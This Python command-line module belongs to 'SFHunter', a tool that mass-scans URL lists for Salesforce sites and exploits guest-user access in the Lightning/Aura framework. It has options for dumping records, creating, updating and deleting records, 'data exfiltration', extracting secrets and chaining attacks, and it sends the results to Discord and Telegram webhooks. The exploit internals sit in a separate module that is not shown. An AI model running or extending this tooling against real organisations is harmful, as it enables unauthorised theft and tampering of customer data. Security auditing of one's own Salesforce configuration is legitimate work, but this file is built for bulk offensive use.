#!/usr/bin/env python3
"""
SFHunter CLI module
"""

import sys
import os
import json
import subprocess
import requests
from .core import SFHunter

# ASCII Banner
BANNER = r"""
 ______     ______   __  __     __  __     __   __     ______   ______     ______    
/\  ___\   /\  ___\ /\ \_\ \   /\ \/\ \   /\ "-.\ \   /\__  _\ /\  ___\   /\  == \   
\ \___  \  \ \  __\ \ \  __ \  \ \ \_\ \  \ \ \-.  \  \/_/\ \/ \ \  __\   \ \  __<   
 \/\_____\  \ \_\    \ \_\ \_\  \ \_____\  \ \_\"\_\    \ \_\  \ \_____\  \ \_\ \_\ 
  \/_____/   \/_/     \/_/\/_/   \/_____/   \/_/ \/_/     \/_/   \/_____/   \/_/ /_/ 

High-performance Salesforce URL scanner with advanced detection capabilities
"""

def update_sfhunter():
    """Update SFHunter to the latest version from PyPI"""
    print("🔄 Checking for SFHunter updates...")
    
    try:
        # Check current version
        current_version = "1.2.0"
        print(f"Current version: {current_version}")
        
        # Check latest version from PyPI
        response = requests.get("https://pypi.org/pypi/sfhunter/json", timeout=10)
        if response.status_code == 200:
            data = response.json()
            latest_version = data["info"]["version"]
            print(f"Latest version: {latest_version}")
            
            if latest_version == current_version:
                print("✅ SFHunter is already up to date!")
                return
            
            print(f"🔄 Updating from {current_version} to {latest_version}...")
            
            # Update using pip
            try:
                result = subprocess.run([
                    sys.executable, "-m", "pip", "install", "--upgrade", "sfhunter"
                ], check=True, capture_output=True, text=True)
                
                print("✅ SFHunter updated successfully!")
                print("🔄 Please restart your terminal or run 'hash -r' to use the updated version.")
                
            except subprocess.CalledProcessError as e:
                print(f"❌ Update failed: {e}")
                print(f"Error output: {e.stderr}")
                
        else:
            print("❌ Could not check for updates. Please check your internet connection.")
            
    except requests.RequestException as e:
        print(f"❌ Network error while checking for updates: {e}")
    except Exception as e:
        print(f"❌ Unexpected error: {e}")

def main():
    """Main CLI entry point"""
    print(BANNER)
    
    import argparse
    
    parser = argparse.ArgumentParser(
        description="High-performance Salesforce URL scanner with advanced detection capabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="Path to a file of URLs (one per line)")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("--ignore-ssl", action="store_true", help="Ignore SSL certificate errors")
    parser.add_argument("--discord-webhook", help="Discord webhook URL to send verified findings")
    parser.add_argument("--telegram-bot-token", help="Telegram bot token for notifications")
    parser.add_argument("--telegram-chat-id", help="Telegram chat ID for notifications")
    parser.add_argument("--high-performance", action="store_true", help="Enable high-performance parallel processing")
    parser.add_argument("--max-workers", type=int, default=50, help="Maximum number of worker threads (default: 50)")
    parser.add_argument("--concurrent-downloads", type=int, default=200, help="Maximum concurrent downloads (default: 200)")
    parser.add_argument("--batch-size", type=int, default=100, help="Batch size for processing (default: 100)")
    parser.add_argument("--connection-limit", type=int, default=100, help="HTTP connection limit (default: 100)")
    parser.add_argument("--content", action="store_true", help="Enable content-based detection (may increase false positives)")
    parser.add_argument("--exploit", action="store_true", help="Attempt to exploit detected Salesforce instances")
    parser.add_argument("--list-objects", action="store_true", help="List available Salesforce objects (use with --exploit)")
    parser.add_argument("--dump-objects", action="store_true", help="Dump object data (use with --exploit)")
    parser.add_argument("--objects", nargs="*", default=["User"], help="Specific objects to dump (use with --exploit)")
    parser.add_argument("--advanced-exploit", action="store_true", help="Perform advanced Lightning framework exploitation")
    parser.add_argument("--deep-scan", action="store_true", help="Perform deep data extraction and security analysis")
    parser.add_argument("--comprehensive-test", action="store_true", help="Run comprehensive Lightning framework test with security recommendations")
    parser.add_argument("--test-write-permissions", action="store_true", help="Test what guest users can WRITE to (CREATE/UPDATE/DELETE)")
    parser.add_argument("--data-exfiltration", action="store_true", help="Test data exfiltration capabilities and bulk access")
    parser.add_argument("--full-exploitation", action="store_true", help="Run ALL exploitation tests including write permissions and data exfiltration")
    parser.add_argument("--guest-security-audit", action="store_true", help="Perform comprehensive guest user security audit based on Salesforce best practices")
    parser.add_argument("--enterprise-security-test", action="store_true", help="Run enterprise-grade security testing suite")
    parser.add_argument("--poc-testing", action="store_true", help="Perform Proof of Concept testing with actual payload execution")
    parser.add_argument("--extract-secrets", action="store_true", help="Extract API keys, secrets, and tokens from Salesforce objects")
    parser.add_argument("--chain-attacks", action="store_true", help="Chain multiple exploitation attacks based on found data")
    parser.add_argument("--full-chain-exploit", action="store_true", help="Run complete attack chain: secrets extraction + chaining + PoC")
    parser.add_argument("-up", "--update", action="store_true", help="Update SFHunter to the latest version from PyPI")
    parser.add_argument("-v", "--version", action="version", version="SFHunter v1.2.0")
    
    args = parser.parse_args()
    
    # Handle update command
    if args.update:
        update_sfhunter()
        return
    
    if not args.url and not args.file:
        print("[!] Use -u <url> or -f <file>")
        parser.print_help()
        return
    
    # Initialize SFHunter
    detector = SFHunter(
        high_performance=args.high_performance,
        max_workers=args.max_workers,
        concurrent_downloads=args.concurrent_downloads,
        batch_size=args.batch_size,
        connection_limit=args.connection_limit
    )
    
    # Override Discord webhook if provided
    if args.discord_webhook:
        detector.config["discord_webhook_url"] = args.discord_webhook
    
    # Override Telegram settings if provided
    if args.telegram_bot_token:
        detector.config["telegram_bot_token"] = args.telegram_bot_token
    if args.telegram_chat_id:
        detector.config["telegram_chat_id"] = args.telegram_chat_id
    
    # Collect URLs
    urls = []
    if args.url:
        urls = [args.url]
    elif args.file:
        if not os.path.exists(args.file):
            print(f"[!] File not found: {args.file}")
            return
        with open(args.file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    
    # Remove duplicates
    urls = list(set(urls))
    
    print(f"[+] Loaded {len(urls)} URL(s). Starting scan...")
    
    # Scan URLs (with content detection if requested)
    results = detector.scan_urls(urls, check_content=args.content)
    
    # Print scan summary
    detector.print_scan_summary()
    
    # Always save results (even if empty)
    output_file = args.output or "salesforce_results.txt"
    filepath = detector.save_results(results, output_file)
    print(f"[+] Results saved → {filepath}")
    
    if results:
        # Send results summary to Discord and Telegram
        detector.send_discord_file(filepath, results)
        
        # Send summary to Telegram
        summary_message = f"""
🔍 <b>SFHunter Scan Complete</b>

📊 <b>Scan Summary:</b>
• Total URLs: {len(urls)}
• Successful scans: {len(results)}
• Salesforce instances found: {len(results)}

📁 <b>Results saved to:</b> <code>{filepath}</code>

<i>SFHunter Detection Complete</i>
"""
        detector.send_telegram_message(summary_message, filepath)
        
        # Attempt exploitation if requested
        if args.exploit or args.advanced_exploit or args.comprehensive_test or args.test_write_permissions or args.data_exfiltration or args.full_exploitation or args.guest_security_audit or args.enterprise_security_test:
            print("\n[+] Starting exploitation phase...")
            exploit_results = []
            
            for result in results:
                if result.get("status") == "detected":
                    url = result.get("final_url")
                    print(f"[+] Attempting to exploit: {url}")
                    
                    try:
                        if args.full_exploitation:
                            # Run ALL exploitation tests
                            print(f"[+] Running FULL exploitation suite...")
                            
                            # Basic exploitation first
                            exploit_result = detector.exploit_salesforce(
                                url, 
                                objects=args.objects,
                                list_objects=args.list_objects,
                                dump_objects=args.dump_objects
                            )
                            
                            # Advanced exploitation
                            advanced_result = detector.advanced_lightning_exploitation(url, deep_scan=True)
                            exploit_result.update(advanced_result)
                            
                            # Write permission testing
                            print(f"[+] Testing write permissions...")
                            write_perms = detector.test_write_permissions(url, advanced_result.get("aura_context", ""))
                            exploit_result["write_permissions"] = write_perms
                            
                            # Data exfiltration testing
                            print(f"[+] Testing data exfiltration...")
                            exfiltration = detector.perform_data_exfiltration_test(url, advanced_result.get("aura_context", ""))
                            exploit_result["data_exfiltration"] = exfiltration
                            
                            # Comprehensive test
                            comprehensive = detector.comprehensive_lightning_test(url)
                            exploit_result.update(comprehensive)
                            
                        elif args.comprehensive_test:
                            # Comprehensive Lightning framework test
                            print(f"[+] Running comprehensive Lightning framework test...")
                            exploit_result = detector.comprehensive_lightning_test(url)
                            
                            # Print security recommendations
                            if exploit_result.get("recommendations"):
                                print(f"\n[!] SECURITY RECOMMENDATIONS:")
                                for i, rec in enumerate(exploit_result["recommendations"], 1):
                                    print(f"    {i}. {rec}")
                            
                        elif args.advanced_exploit:
                            # Advanced Lightning exploitation
                            print(f"[+] Running advanced Lightning exploitation...")
                            exploit_result = detector.advanced_lightning_exploitation(
                                url, 
                                deep_scan=args.deep_scan
                            )
                            
                            # Print advanced findings
                            if exploit_result.get("org_info"):
                                print(f"[+] Organization information gathered: {len(exploit_result['org_info'])} items")
                            if exploit_result.get("security_analysis"):
                                print(f"[+] Security analysis completed: {len(exploit_result['security_analysis'])} checks")
                            if exploit_result.get("data_extraction"):
                                exposed_objects = [obj for obj, data in exploit_result['data_extraction'].items() if data.get('success')]
                                if exposed_objects:
                                    print(f"[!] CRITICAL: Sensitive objects exposed: {', '.join(exposed_objects)}")
                                    
                        elif args.test_write_permissions:
                            # Write permission testing only
                            print(f"[+] Testing write permissions...")
                            basic_result = detector.exploit_salesforce(url, objects=["User"], list_objects=True)
                            if basic_result.get("vulnerable"):
                                aura_context = basic_result.get("exploits", [{}])[0].get("aura_context", "")
                                if aura_context:
                                    write_perms = detector.test_write_permissions(url, aura_context)
                                    basic_result["write_permissions"] = write_perms
                                    
                                    # Print write permission findings
                                    if write_perms.get("critical_findings"):
                                        print(f"\n[!] CRITICAL WRITE PERMISSIONS:")
                                        for finding in write_perms["critical_findings"]:
                                            print(f"    • {finding}")
                                    
                                    # Print PoC results
                                    if write_perms.get("poc_results"):
                                        print(f"\n🚨 PROOF OF CONCEPT RESULTS:")
                                        for poc_name, poc_data in write_perms["poc_results"].items():
                                            if poc_data.get("exploitable"):
                                                print(f"    ✅ {poc_name}: {poc_data.get('summary', '')}")
                                                if poc_data.get("evidence"):
                                                    evidence = poc_data["evidence"]
                                                    if evidence.get("created_record_id"):
                                                        print(f"        📝 Created Record ID: {evidence['created_record_id']}")
                                                    if evidence.get("updated_record_id"):
                                                        print(f"        📝 Updated Record ID: {evidence['updated_record_id']}")
                                                    if evidence.get("deleted_record_id"):
                                                        print(f"        📝 Deleted Record ID: {evidence['deleted_record_id']}")
                                                    print(f"        ⏰ Timestamp: {evidence.get('timestamp', 'Unknown')}")
                                            else:
                                                print(f"    ❌ {poc_name}: {poc_data.get('summary', '')}")
                                    
                                    # Print exploitable objects summary
                                    if write_perms.get("exploitable_objects"):
                                        print(f"\n🎯 EXPLOITABLE OBJECTS:")
                                        for obj in write_perms["exploitable_objects"]:
                                            print(f"    🔥 {obj}")
                            exploit_result = basic_result
                            
                        elif args.data_exfiltration:
                            # Data exfiltration testing only
                            print(f"[+] Testing data exfiltration...")
                            basic_result = detector.exploit_salesforce(url, objects=["User"], list_objects=True)
                            if basic_result.get("vulnerable"):
                                aura_context = basic_result.get("exploits", [{}])[0].get("aura_context", "")
                                if aura_context:
                                    exfiltration = detector.perform_data_exfiltration_test(url, aura_context)
                                    basic_result["data_exfiltration"] = exfiltration
                                    
                                    # Print exfiltration findings
                                    if exfiltration.get("bulk_data_access"):
                                        print(f"\n[!] BULK DATA ACCESS:")
                                        bulk_data = exfiltration["bulk_data_access"]
                                        
                                        # Show HTML response summary
                                        if bulk_data.get("html_response_count", 0) > 0:
                                            print(f"    • HTML Responses: {bulk_data['html_response_count']} objects require authentication")
                                            if bulk_data.get("protected_objects"):
                                                print(f"    • Protected Objects: {', '.join(bulk_data['protected_objects'])}")
                                        
                                        # Show accessible objects
                                        if bulk_data.get("accessible_objects"):
                                            print(f"    • Accessible Objects: {', '.join(bulk_data['accessible_objects'])}")
                                        
                                        # Show successful tests
                                        for test, result in bulk_data.items():
                                            if isinstance(result, dict) and result.get("success"):
                                                print(f"    • {test}: {result.get('records_retrieved', 0)} records")
                                    
                                    if exfiltration.get("sensitive_data_exposure"):
                                        print(f"\n[!] SENSITIVE DATA EXPOSURE:")
                                        for obj, result in exfiltration["sensitive_data_exposure"].items():
                                            if result.get("success") and result.get("exposed_fields"):
                                                print(f"    • {obj}: {', '.join(result['exposed_fields'])}")
                            exploit_result = basic_result
                            
                        elif args.guest_security_audit:
                            # Guest user security audit
                            print(f"[+] Performing guest user security audit...")
                            basic_result = detector.exploit_salesforce(url, objects=["User"], list_objects=True)
                            if basic_result.get("vulnerable"):
                                aura_context = basic_result.get("exploits", [{}])[0].get("aura_context", "")
                                if aura_context:
                                    security_audit = detector.perform_guest_user_security_audit(url, aura_context)
                                    basic_result["guest_security_audit"] = security_audit
                                    
                                    # Print security audit findings
                                    if security_audit.get("security_violations"):
                                        print(f"\n[!] SECURITY VIOLATIONS:")
                                        for violation in security_audit["security_violations"][:10]:  # Limit to 10
                                            print(f"    • {violation}")
                                    
                                    if security_audit.get("recommendations"):
                                        print(f"\n[!] SECURITY RECOMMENDATIONS:")
                                        for i, rec in enumerate(security_audit["recommendations"][:5], 1):  # Limit to 5
                                            print(f"    {i}. {rec}")
                            exploit_result = basic_result
                            
                        elif args.enterprise_security_test:
                            # Enterprise-grade security testing
                            print(f"[+] Running enterprise-grade security testing...")
                            
                            # Run all security tests
                            basic_result = detector.exploit_salesforce(url, objects=["User"], list_objects=True)
                            if basic_result.get("vulnerable"):
                                aura_context = basic_result.get("exploits", [{}])[0].get("aura_context", "")
                                if aura_context:
                                    # Advanced exploitation
                                    advanced_result = detector.advanced_lightning_exploitation(url, deep_scan=True)
                                    basic_result.update(advanced_result)
                                    
                                    # Write permission testing
                                    write_perms = detector.test_write_permissions(url, aura_context)
                                    basic_result["write_permissions"] = write_perms
                                    
                                    # Data exfiltration testing
                                    exfiltration = detector.perform_data_exfiltration_test(url, aura_context)
                                    basic_result["data_exfiltration"] = exfiltration
                                    
                                    # Guest security audit
                                    security_audit = detector.perform_guest_user_security_audit(url, aura_context)
                                    basic_result["guest_security_audit"] = security_audit
                                    
                                    # Comprehensive test
                                    comprehensive = detector.comprehensive_lightning_test(url)
                                    basic_result.update(comprehensive)
                                    
                                    # Print enterprise findings
                                    print(f"\n[!] ENTERPRISE SECURITY ASSESSMENT:")
                                    if write_perms.get("critical_findings"):
                                        print(f"    • Write Permissions: {len(write_perms['critical_findings'])} critical findings")
                                    if exfiltration.get("bulk_data_access"):
                                        bulk_success = len([r for r in exfiltration["bulk_data_access"].values() if r.get("success")])
                                        print(f"    • Data Exfiltration: {bulk_success} bulk access methods successful")
                                    if security_audit.get("security_violations"):
                                        print(f"    • Security Violations: {len(security_audit['security_violations'])} violations found")
                                    if comprehensive.get("recommendations"):
                                        print(f"    • Security Recommendations: {len(comprehensive['recommendations'])} recommendations")
                            exploit_result = basic_result
                                    
                        else:
                            # Basic exploitation
                            exploit_result = detector.exploit_salesforce(
                                url, 
                                objects=args.objects,
                                list_objects=args.list_objects,
                                dump_objects=args.dump_objects
                            )
                        
                        exploit_results.append({
                            "url": url,
                            "exploit_result": exploit_result
                        })
                        
                        if exploit_result.get("vulnerable"):
                            print(f"[+] VULNERABLE: {url}")
                            if exploit_result.get("exploits"):
                                for exploit in exploit_result["exploits"]:
                                    print(f"    Endpoint: {exploit['endpoint']}")
                                    if exploit.get("object_list"):
                                        print(f"    Objects found: {len(exploit['object_list'])}")
                                    if exploit.get("results"):
                                        print(f"    Data extracted: {len(exploit['results'])} objects")
                            
                            # Send detailed findings to Discord and Telegram
                            detector.send_discord_exploitation_findings(url, exploit_result)
                            detector.send_telegram_exploitation_findings(url, exploit_result)
                        else:
                            print(f"[-] Not vulnerable: {url}")
                            
                    except Exception as e:
                        print(f"[-] Exploitation failed for {url}: {e}")
                        logger.error("Exploitation error for {}: {}".format(url, e))
            
            # Save exploitation results
            if exploit_results:
                if args.comprehensive_test:
                    exploit_file = "comprehensive_test_results.json"
                elif args.advanced_exploit:
                    exploit_file = "advanced_exploit_results.json"
                else:
                    exploit_file = "exploit_results.json"
                    
                with open(exploit_file, "w") as f:
                    json.dump(exploit_results, f, indent=2)
                print(f"[+] Exploitation results saved to: {exploit_file}")
                
                # Send exploitation results to Discord
                detector.send_discord_file(exploit_file, [])
    else:
        print("[!] No Salesforce sites detected.")

if __name__ == "__main__":
    main()
